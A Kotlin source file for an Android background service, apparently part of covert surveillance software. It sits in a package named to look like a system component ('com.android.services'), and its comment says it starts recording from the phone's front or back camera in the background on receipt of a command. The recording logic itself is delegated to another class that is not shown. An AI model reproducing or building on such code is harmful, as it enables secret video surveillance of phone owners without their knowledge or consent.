package com.android.services.services.videoBug

import android.content.Intent
import android.os.Build
import android.os.IBinder
import androidx.annotation.RequiresApi
import androidx.lifecycle.LifecycleService
import com.android.services.di.module.ApplicationScope
import com.android.services.interfaces.IBackgroundProcessing
import com.android.services.logs.source.LocalDatabaseSource
import dagger.hilt.android.AndroidEntryPoint
import kotlinx.coroutines.CoroutineScope
import javax.inject.Inject

/**
 * [VideoBugCommandService] is a Service to video from the phone's front or back camera,
 * This service receives a Command to start recording using phone's camera,
 * and immediately starts recording in the background
 */

@RequiresApi(Build.VERSION_CODES.LOLLIPOP)
@AndroidEntryPoint
class VideoBugCommandService : LifecycleService() {

    @Inject
    lateinit var localDatabaseSource: LocalDatabaseSource

    @Inject
    @ApplicationScope
    lateinit var coroutineScope: CoroutineScope
    lateinit var videoBugProcessingI: IBackgroundProcessing

    override fun onCreate() {
        super.onCreate()
        videoBugProcessingI =
            VideoBugCommandProcessingBaseImpl(this, localDatabaseSource, coroutineScope)
        videoBugProcessingI.onCreate()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        super.onStartCommand(intent, flags, startId)
        return videoBugProcessingI.onStartCommand(intent!!, flags, startId)
    }

    override fun onDestroy() {
        super.onDestroy()
        videoBugProcessingI.onDestroy()
    }
}